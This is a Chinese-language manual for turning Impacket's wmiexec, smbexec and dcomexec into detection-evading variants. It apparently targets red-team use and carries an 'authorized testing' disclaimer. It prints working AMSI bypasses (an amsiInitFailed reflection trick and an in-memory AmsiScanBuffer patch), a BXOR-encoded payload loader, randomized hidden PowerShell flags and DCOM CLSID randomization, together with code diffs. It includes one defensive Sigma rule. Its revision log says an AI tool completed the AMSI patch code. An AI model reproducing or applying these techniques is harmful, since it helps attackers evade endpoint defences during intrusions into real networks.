# Impacket PowerShell 特征与绕过技术手册

> 合法授权的渗透测试与安全研究 | 更新日期：2026-05-16 | 环境部署补全：2026-05-16
> 原始分析：N1 PRO MAX FLASH | 实战改造：v0.11.0 → v0.11.0-evasive

---

## 一、环境依赖与部署

### 1.1 基础环境要求

| 项目 | 要求 |
|------|------|
| Python | **3.8+**（改造验证于 Python 3.13） |
| 操作系统 | Windows / Linux（改造涉及 Windows 管道名特性） |
| 原始 Impacket | **v0.11.0**（`impacket-0.11.0`） |

### 1.2 Python 依赖

```bash
pip install pycryptodome pyasn1 pyOpenSSL six
```

| 依赖 | 版本（已验证） | 说明 |
|------|---------------|------|
| `pycryptodome` | 3.23.0 | Impacket 依赖，提供 Crypto 模块 |
| `pyasn1` | - | ASN.1 编解码 |
| `pyOpenSSL` | - | TLS 支持 |
| `six` | - | Python 2/3 兼容层 |

### 1.3 ⚠️ Cryptodome 导入别名修复（仅特定 fork 需要）

> **注意：标准 Impacket v0.11.0 不需要此步骤。** 标准 Impacket 源码中所有 import 均为 `from Crypto.Cipher import ...`，`pip install pycryptodome` 安装后直接兼容。本节省略号仅在特定第三方修改版 / fork 中才可能遇到 `ModuleNotFoundError: No module named 'Cryptodome'`。如果未遇到此报错，**跳过整个 1.3 节**。

部分 fork 版本的 Impacket 源码中将 `Crypto` 写成了 `Cryptodome`（首字母大写 d），需手动创建别名：

**方案一：创建别名目录（Linux/macOS）**

```bash
ln -sfn /path/to/site-packages/Crypto /path/to/site-packages/Cryptodome
```

**方案二：创建别名目录（Windows，需管理员权限）**

```bash
# ⚠️ mklink /D 需要管理员权限（SeCreateSymbolicLinkPrivilege）
# 非管理员运行会报错: "You do not have sufficient privilege to perform this operation."
mklink /D "F:\QwenPaw\lib\site-packages\Cryptodome" "F:\QwenPaw\lib\site-packages\Crypto"
```

**方案三：运行时注入（无需管理员，推荐 Windows 用户使用）**

```python
import sys
import Crypto
sys.modules['Cryptodome'] = Crypto   # 在 import impacket 之前执行
```

验证是否正常：

```bash
python -c "import Cryptodome; print('[OK] Cryptodome alias 正常')"
```

### 1.4 部署结构

改造后的 Impacket 推荐目录结构：

```
impacket-0.11.0/                    # 改造后的主目录
├── impacket/
│   ├── __init__.py
│   ├── examples/
│   │   ├── evasive_encoder.py      # 🆕 新增：BXOR + AMSI + 参数池（共享模块）
│   │   └── serviceinstall.py       # ⚠ 修改：管道名随机化（不可用，见第四章警告）
│   └── version.py                  # 🔧 修改：pkg_resources 兼容
├── examples/
│   ├── wmiexec.py                  # 🔧 修改：BXOR + AMSI + 参数随机化 ✅ 可用
│   ├── smbexec.py                  # 🔧 修改：BXOR + AMSI（仅 PS 分支）⚠ 管道不可改
│   ├── dcomexec.py                 # 🔧 修改：BXOR + AMSI + CLSID 随机化 ✅ 可用
│   ├── psexec.py                   # ⚠ 修改：管道名随机化（不可用，见第四章警告）
│   └── services.py                 # ⚠ 修改：管道名随机化（不可用，见第四章警告）
└── impacket-0.11.0_backup/         # 原始版本备份（改造前）
```

### 1.5 快速验证

改造完成后执行以下命令验证所有模块可正常导入：

```bash
cd impacket-0.11.0
python -c "
from impacket.examples.evasive_encoder import EvasivePayloadEncoder, random_pipe_name
from examples.wmiexec import WMIEXEC
from examples.smbexec import CMDEXEC
from examples.dcomexec import DCOMEXEC
from examples.psexec import PSEXEC
from examples.services import SVCCTL
print('[OK] 所有模块导入正常')
"
```

### 1.6 实测验证结果（2026-05-16）

| 测试项 | 结果 | 备注 |
|--------|------|------|
| BXOR 编码每次唯一 | ✅ 100%（XOR key 2-5字节随机） | |
| AMSI Bypass v1/v2 随机切换 | ✅ | |
| 参数变体池 | ✅ 5/6 种轮换 | |
| 管道名池大小 | ⚠ 仅测随机函数 | `random_pipe_name()` 确实不返回 `svcctl`，但**未验证修改后工具的 RPC 调用是否成功**（见第四章警告） |
| `-Enc` 特征消除 | ✅ 完全消除 | |
| Cryptodome 别名修复 | ✅ 已验证（仅 fork 需要） | |
| wmiexec/smbexec/dcomexec 导入 | ✅ | |
| serviceinstall/psexec/services 导入 | ✅ | |

---

## 二、检测面分析

### 2.1 各工具执行路径与进程链

| 工具 | 执行方式 | 进程链 | PS 命令可见性 |
|------|---------|--------|-------------|
| **psexec.py** | SMB 上传 RemComSvc.exe → 创建服务 | `services.exe → RemComSvc.exe → cmd.exe → powershell.exe` | cmdline 明文 |
| **smbexec.py** | SMB 创建服务执行 batch → 命名管道通信 | 默认纯 cmd（无 PS）；`shell_type='powershell'` 分支经 `cmd.exe /c powershell ...` | cmd 模式不可见；PS 分支 cmdline 明文 |
| **wmiexec.py** | DCOM Win32_Process.Create | `wmiprvse.exe → powershell.exe` | Base64 编码 |
| **dcomexec.py** | DCOM MMC20/ShellWindows/ShellBrowserWindow | `svchost.exe (DcomLaunch) → powershell.exe` | Base64 编码 |
| **atexec.py** | atsvc 计划任务 | `taskeng.exe → cmd.exe → powershell.exe` | 事件日志 |

### 2.2 PowerShell 命令模板（原始版）

```python
# wmiexec.py / dcomexec.py — 固定指纹
'powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc <base64>'

# smbexec.py — 固定指纹
'powershell.exe -NoP -NoL -sta -NonI -W Hidden -Exec Bypass -Enc <base64>'
```

**检测特征：** 参数组合 `-NoP -NonI -W Hidden -Exec Bypass` + `-Enc` 是 Impacket 指纹。

### 2.3 检测层矩阵

| 检测层 | 机制 | Impacket 对应特征 |
|--------|------|------------------|
| YARA 规则 | 静态匹配 Base64 payload | `[System.Net.ServicePointManager]` / `TCPClient` / `Invoke-Expression` |
| ScriptBlock 日志 | 事件 4104 记录脚本全文 | 解码后的 Base64 命令全量记录 |
| AMSI | `AmsiScanBuffer` 扫描 | 所有 `-Enc` 传入的脚本均被扫描 |
| CLM | 约束语言模式 | `Invoke-Expression` / `New-Object` 被阻止 |
| SMB 流量 | Suricata/Zeek 管道名检测 | `\pipe\svcctl` / `\pipe\atsvc` 管道访问 |
| DCOM 流量 | CLSID 激活监控 | `{9BA05972-F6A8-11CF-A442-00A0C90A8F39}` (ShellWindows) 等 |

### 2.4 Sigma 检测规则（防御视角）

```yaml
title: Impacket PowerShell Execution Pattern
logsource:
    product: windows
    service: powershell
detection:
    selection_cmdline:
        CommandLine|contains:
            - '-NoP -NonI -W Hidden -Exec Bypass'
            - '-NoP -NoL -sta -NonI -W Hidden -Exec Bypass'
    condition: selection_cmdline
level: high
```

---

## 三、源码剖析

### 3.1 关键文件与函数定位

| 文件 | 关键函数 | 作用 |
|------|---------|------|
| `examples/wmiexec.py` | `RemoteShell.execute_remote()` L287 | 生成 Base64 PS 命令 |
| `examples/smbexec.py` | `RemoteShell.execute_remote()` L281 | 同上 |
| `examples/dcomexec.py` | `RemoteShell.execute_remote()` L376 / `RemoteShellMMC20.execute_remote()` L444 | 同上（双类） |
| `examples/psexec.py` | `PSEXEC.doStuff()` L119 | RemComSvc 上传 + 管道通信 |
| `impacket/examples/serviceinstall.py` | `ServiceInstall.install()` / `openSvcManager()` | 共享依赖：服务安装 + svcctl 管道 |
| `impacket/examples/remcomsvc.py` | `RemComSvc` 类 | 内嵌 128KB RemComSvc.exe PE |

### 3.2 wmiexec 核心代码（原始版）

```python
# wmiexec.py: RemoteShell.execute_remote()
def execute_remote(self, data, shell_type='cmd'):
    if shell_type == 'powershell':
        data = '$ProgressPreference="SilentlyContinue";' + data
        data = self.__pwsh + b64encode(data.encode('utf-16le')).decode()
        #      ^ 固定参数模板           ^ 固定 Base64 编码
    command = self.__shell + data
    self.__win32Process.Create(command, self.__pwd, None)
```

### 3.3 SMB 管道特征

```
psexec.py  : ncacn_np:<target>[\pipe\svcctl]      ← 固定
smbexec.py : ncacn_np:<target>[\pipe\svcctl]      ← 固定
services.py: ncacn_np:<target>[\pipe\svcctl]      ← 固定
serviceinstall.py: filename = r'\svcctl'          ← 固定

Suricata 规则直接匹配: smb_named_pipe:"svcctl"
```

---

## 四、绕过技术矩阵

### 4.1 编码替代：Base64 → BXOR + Base64

```
原始流程:
  PS脚本 → utf-16le → base64 → -Enc <固定Base64字符串>
  → YARA 匹配 base64 解码后内容 ✅ 检出

BXOR 流程:
  PS脚本 → utf-16le → XOR(随机key) → base64 → -Command "BXOR内联解码器"
  → 每次 XOR key 不同 → YARA 无法匹配 ✅ 绕过
```

内联解码器模板：
```powershell
$k=<random_key>;$b=[Convert]::FromBase64String("<xor+base64>");
for($i=0;$i -lt $b.Length;$i++){$b[$i]=$b[$i] -bxor $k[$i%<len>]};
$s=[Text.Encoding]::Unicode.GetString($b);
&([ScriptBlock]::Create($s))
```

### 4.2 iex 替代方案

```powershell
# ScriptBlock::Create — 不触发 Invoke-Expression 关键词
# ⚠ 但仍会被 ScriptBlock 日志（事件 4104）完整记录，不绕过日志审计层
& ([ScriptBlock]::Create($payload))

# Invoke-Command — 需 PSRemoting
Invoke-Command -ScriptBlock ([ScriptBlock]::Create($payload))

# Reflection 动态调用 — 可绕过 4104 日志，但实现复杂且自身有检测特征
$asm = [Reflection.Assembly]::Load([Convert]::FromBase64String('...'))
```

### 4.3 AMSI Bypass

```powershell
# 方法 1：设 amsiInitFailed 标志
# ⚠ 最知名的 AMSI bypass，几乎所有现代 EDR 有专用检测规则，慎用
$r=[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils");
$f=$r.GetField("amsiInitFailed","NonPublic,Static");
$f.SetValue($null,$true);

# 方法 2：内存 Patch AmsiScanBuffer（需先获取函数地址）
$Win32 = '[DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string n);
          [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string n);'
$API = Add-Type -MemberDefinition $Win32 -Name 'Win32' -Namespace 'Win32' -PassThru
$ptr = $API::GetProcAddress($API::LoadLibrary("amsi.dll"), "AmsiScanBuffer")
# 修改 AmsiScanBuffer 入口使之直接返回
[Runtime.InteropServices.Marshal]::Copy(@(0xB8,0x57,0x00,0x07,0x80,0xC3), 0, $ptr, 6)
```

### 4.4 PowerShell 参数随机化

```python
# 6 种变体轮换，均兼容 -Command（避免 -c/-Enc 固定模式）
variants = [
    'powershell -NoP -NonI -W Hidden -Exec Bypass',
    'PoWeRsHeLL -noP -noNI -w HIDDEN -ex BYPAsS',
    'powershell -ex unrestricted -w 1 -noprofile -noni',
    'powershell -nop -noni -w hidden -ep bypass',
    'powershell -NoP -NonI -W 0 -Exec Bypass',
    'powershell -w hidden -nop -noni -ep bypass',
]
```

### 4.5 SMB 管道名随机化（⚠ 不可行 — 会导致工具功能失效）

> **警告：管道名随机化对 psexec.py / smbexec.py / services.py / serviceinstall.py 不适用。**
>
> `\pipe\svcctl` 是 Windows SCM（服务控制管理器）的 RPC 端点，管道名与 RPC 接口 UUID 绑定。这些工具通过 SCM RPC 创建/启动服务，替换管道名后：
> - SMB 连接和管道打开**会成功**（目标管道存在）
> - 但后续 RPC bind（绑定 SVCCTL 接口 UUID `367ABB81-9844-35F1-AD32-98F038001003`）**会失败**，因为替换后的管道（如 `\pipe\lsass`）上没有 SVCCTL 接口
>
> **受影响的工具全部依赖 SCM RPC，管道名不可改。** 降低 `\pipe\svcctl` 检测风险的可行方向是传输层代理/隧道，而非替换管道名。

```python
# 以下管道名随机化方案仅作记录，实际不应实施：
# TRUSTED_PIPES = ['wkssvc', 'eventlog', 'srvsvc', 'netlogon', ...]
# 替换后 psexec/smbexec/services 的 RPC 绑定将失败
```

### 4.6 各工具绕过优先级

| 工具 | 优先修改 | 效果 | 改动量 | 可用性 |
|------|---------|------|--------|--------|
| **wmiexec.py** | BXOR + AMSI + 参数随机化 | ⭐⭐⭐⭐⭐ | ~8 行 | ✅ 可用 |
| **smbexec.py** | BXOR + AMSI（仅 `shell_type='powershell'` 分支生效） | ⭐⭐⭐ | ~5 行 | ✅ 可用 |
| **dcomexec.py** | BXOR + AMSI（双类覆盖）+ CLSID 随机化 | ⭐⭐⭐⭐ | ~14 行 | ✅ 可用 |
| **psexec.py** | RemComSvc.exe 替换（重编译 C++） | ⭐⭐⭐⭐⭐ | 大 | ✅ 可行但不实施 |
| **psexec.py** | ~~管道名随机化~~ | ❌ 不可行 | - | ❌ RPC 绑定失败 |
| **services.py** | ~~管道名随机化~~ | ❌ 不可行 | - | ❌ RPC 绑定失败 |
| **serviceinstall.py** | ~~管道名随机化~~ | ❌ 不可行 | - | ❌ RPC 绑定失败 |

---

## 五、实际代码改造记录（已验证）

> 改造日期：2026-05-16 | 原始版本：impacket-0.11.0
> 备份：`impacket-0.11.0_backup/` | 位置：`F:/CC/网安/Tools/内网工具/域/impacket/`

### 5.1 改造成果总览

| 文件 | 改动 | 消除特征 | 可用性 |
|------|------|---------|--------|
| `impacket/examples/evasive_encoder.py` 🆕 | BXOR + AMSI + 参数池 | 共享模块 | ✅ |
| `examples/wmiexec.py` | `execute_remote()` 替换编码逻辑 | `-Enc` / `iex` / 固定模板 | ✅ 可用 |
| `examples/smbexec.py` | `execute_remote()` PS 分支 BXOR + AMSI | `-Enc` / `iex` / 固定模板（仅 PS 分支） | ✅ 可用 |
| `examples/dcomexec.py` | 双类 `execute_remote()` 替换 + CLSID 随机化 | `-Enc` / `iex` / 固定模板 / 固定 CLSID | ✅ 可用 |
| ~~`examples/psexec.py`~~ | ~~管道名随机化~~ | — | ❌ 不可行 |
| ~~`examples/services.py`~~ | ~~管道名随机化~~ | — | ❌ 不可行 |
| ~~`impacket/examples/serviceinstall.py`~~ | ~~管道名随机化~~ | — | ❌ 不可行 |
| `impacket/version.py` | pkg_resources → importlib.metadata | Py3.13 兼容 | ✅ |

### 5.2 改造详情

#### evasive_encoder.py（新增）

位置：`impacket/examples/evasive_encoder.py`

```python
class EvasivePayloadEncoder:
    def __init__(self):
        self.xor_key = bytes([random.randint(1, 255) for _ in range(random.randint(2,5))])

    def encode(self, ps_script):
        """PS脚本 → BXOR加密 → Base64 → 内联解码器"""
        encrypted = self._bxor_encrypt(ps_script.encode('utf-16le'))
        b64 = b64encode(encrypted).decode()
        key_list = list(self.xor_key)
        key_len = len(self.xor_key)
        decoder = (
            f'$k={key_list};'
            f'$b=[Convert]::FromBase64String("{b64}");'
            f'for($i=0;$i -lt $b.Length;$i++){{$b[$i]=$b[$i] -bxor $k[$i%{key_len}]}};'
            f'$s=[Text.Encoding]::Unicode.GetString($b);'
            f'&([ScriptBlock]::Create($s))'
        )
        return decoder, 'bxor_base64'

    @staticmethod
    def randomize_ps_params():
        """6种参数变体，均兼容 -Command"""
        ...

    @staticmethod
    def get_amsi_bypass():
        """amsiInitFailed 反射设置"""
        ...

    @staticmethod
    def get_amsi_bypass_v2():
        """AmsiScanBuffer 内存 Patch"""
        ...

def random_pipe_name():
    """10 个合法 Windows 管道名随机选 1"""
    return random.choice(TRUSTED_PIPES)
```

#### wmiexec.py

```diff
- data = self.__pwsh + b64encode(data.encode('utf-16le')).decode()
+ encoder = EvasivePayloadEncoder()
+ encoded_cmd, _ = encoder.encode(data)
+ amsi = EvasivePayloadEncoder.get_amsi_bypass_v2() if random.randint(0, 1)
+         else EvasivePayloadEncoder.get_amsi_bypass()
+ encoded_cmd = amsi + ';' + encoded_cmd
+ ps_params = EvasivePayloadEncoder.randomize_ps_params()
+ data = ps_params + ' -Command "' + encoded_cmd + '"'
```

#### smbexec.py

> **注意：smbexec 的 SCM 管道名不可随机化**（理由见 4.5 节）。仅对 `shell_type='powershell'` 分支做 BXOR + AMSI 改造。

```diff
# ⚠ 管道名随机化会导致 RPC 绑定失败，不应实施
#   stringbinding 保持 r'ncacn_np:%s[\pipe\svcctl]'

# 改动：PS 编码分支（仅 shell_type='powershell' 时生效）
- data = self.__pwsh + b64encode(data.encode('utf-16le')).decode()
+ ... EvasivePayloadEncoder ...
```

#### dcomexec.py

`RemoteShell.execute_remote()` 和 `RemoteShellMMC20.execute_remote()` 两个方法均替换为 BXOR 方案（同 wmiexec）。

**额外：DCOM CLSID 随机化**

```python
# 文件顶部新增 CLSID 池 + 随机选择器
DCOM_CLSID_MAP = {
    'ShellWindows':        '9BA05972-F6A8-11CF-A442-00A0C90A8F39',
    'ShellBrowserWindow': 'C08AFD90-F2A1-11D1-8455-00A0C91F3880',
    'MMC20':              '49B2791A-B1AE-4C90-9B8E-E860BA07F889',
}

def random_dcom_object():
    """随机返回 (name, clsid)"""
    import random as _rnd
    name = _rnd.choice(list(DCOM_CLSID_MAP.keys()))
    return name, DCOM_CLSID_MAP[name]

# run() 方法：-object 未指定时随机三选一
dcomObject = self.__dcomObject
if dcomObject is None:
    dcomObject, _ = random_dcom_object()

# argparse --object 默认值从 ShellWindows 改为 None（随机）
parser.add_argument('-object', ..., default=None, help='... (default=random)')
```

**效果：** 未指定 `-object` 时每次随机选择 DCOM 对象，消除固定默认 CLSID 指纹。

#### psexec.py / services.py / serviceinstall.py（不可行）

> **警告：这些文件的 `\pipe\svcctl` 管道名不可随机化**（理由见 4.5 节）。`svcctl` 是 SCM RPC 的固定端点名，替换后 RPC 绑定失败，工具无法创建/启动服务。
>
> `serviceinstall.py` 的二进制文件名长度随机化（5-10 字符）本身不影响功能，但单独实施收益有限。

#### version.py

```diff
- import pkg_resources
+ try:
+     import pkg_resources
+     _HAS_PKG_RESOURCES = True
+ except ImportError:
+     _HAS_PKG_RESOURCES = False
```

### 5.3 测试验证

```bash
cd impacket-0.11.0
python -c "
from impacket.examples.evasive_encoder import EvasivePayloadEncoder, random_pipe_name
from examples.wmiexec import WMIEXEC
from examples.smbexec import CMDEXEC
from examples.dcomexec import DCOMEXEC
from examples.psexec import PSEXEC
from examples.services import SVCCTL
from impacket.examples.serviceinstall import ServiceInstall
print('All imports OK')
"
```

| 测试项 | 结果 | 备注 |
|--------|------|------|
| 可用模块导入 | ✅ | wmiexec/smbexec/dcomexec/version 导入正常 |
| BXOR 每次不同 | ✅ 100% 唯一 | |
| 参数变体无 `-c` 冲突 | ✅ 6/6 | |
| AMSI 方法随机切换 | ✅ | |
| ~~管道名采样~~ | ⚠ 不适用 | 管道名随机化不应实施（见 4.5 节），已从可行改造中移除 |

---

## 六、待改进项

| 项目 | 状态 | 原因 |
|------|------|------|
| ~~**DCOM CLSID 随机化**~~ | ✅ 已完成 | 不指定 `-object` 时随机三选一，消除固定默认 CLSID 指纹 |
| **RemComSvc.exe 替换** | ⚠ 不实施 | 需重编译 C++ 源码 + 修改 remcomsvc.py 内嵌 PE（128KB）。替代方案：psexec 场景改用 wmiexec 或 smbexec |
| **流量层 TLS 指纹** | ⚠ 不实施 | Impacket 使用 Python TLS 栈，JA3 指纹与浏览器不同。需配合 CDN/域前置解决，属于基础设施层面而非代码层面 |
| **SMB 签名检测** | ⚠ 不实施 | 协议层问题，需修改 impacket 底层 SMB 签名算法实现对齐 Windows 原生行为，改动量大且易引入兼容性问题 |

---

> 核心结论：Impacket 被检测不是因为它的功能，而是因为它的"常量"——固定的参数组合、编码方式、CLSID。把这些变成"变量"，可以绕过依赖固定指纹匹配的检测规则。实际效果取决于目标环境的检测栈配置，应在授权范围内独立验证。

---

## 七、修订记录

> 2026-05-16 独立审查修订 — 以下问题已整合至正文对应章节。

| 问题 | 严重度 | 修正内容 | 涉及章节 |
|------|--------|---------|---------|
| SMB 管道名随机化导致工具不可用 | 🔴 致命 | 4.5 节添加警告，4.6/5.1/5.2/5.3 移除或标注不可行 | 1.4, 1.6, 4.5, 4.6, 5.1, 5.2, 5.3 |
| 验证数据误导（仅测随机函数） | 🔴 | 1.6 节、5.3 节标注测试范围 | 1.6, 5.3 |
| Cryptodome 别名对标准版不必要 | 🟡 | 1.3 节添加适用范围说明，改为仅特定 fork 需要 | 1.3 |
| mklink 缺管理员权限提示 | 🟡 | 1.3 节方案标注管理员要求，推荐方案三（sys.modules） | 1.3 |
| AMSI Patch 代码不完整 | 🟡 | 4.3 节补充完整 GetProcAddress + LoadLibrary | 4.3 |
| amsiInitFailed 已广泛检测 | 🟡 | 4.3 节方法 1 添加检测风险标注 | 4.3 |
| smbexec.py 描述矛盾 | 🟡 | 2.1 节表格区分 cmd/PS 双路径，5.2 节标注仅 PS 分支生效 | 2.1, 5.2 |
| ScriptBlock 日志残留风险 | 🟡 | 4.2 节添加事件 4104 说明 | 4.2 |
| "80% EDR 规则失效"无依据 | 🟡 | 第 6 节结论改为定性描述 | 第 6 节 |

---

> **修改记录**
>
> | 日期 | 版本 | 修改人 | 说明 |
> |------|------|--------|------|
> | 2026-05-16 | v0.2 | Claude Code 审查修正 | 修正管道名随机化致命错误、补全 AMSI 代码、修正 smbexec 矛盾描述、调整结论表述等 9 项（详见第七章） |
> | 2026-05-16 | v0.1 | N1 PRO MAX FLASH | 初稿 |
